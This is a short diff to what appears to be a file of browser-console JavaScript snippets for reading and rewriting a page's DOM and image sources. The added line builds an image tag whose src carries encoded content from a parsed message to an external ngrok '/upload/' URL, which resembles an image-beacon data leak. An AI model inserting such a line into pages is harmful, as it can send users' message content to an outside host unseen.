@@ -61,6 +61,8 @@ temp1.parentNode.parentNode.childNodes[1].childNodes[0].childNodes[0].src
 // get string position to replace
 [...e.matchAll(/\/img\//g)].map(x=>{p=x.index;q=e.substr(p).indexOf('"><');console.log(p,q);return[p,q]})
 
+e1 ='<img width=300 src="https://866196a35a9f.ngrok-free.app/upload/'+encodeURI( JSON.parse(a_msg[12])[1].r[2].substr(6) )+'">' 
+
 // ====
 
 // post message from parent console
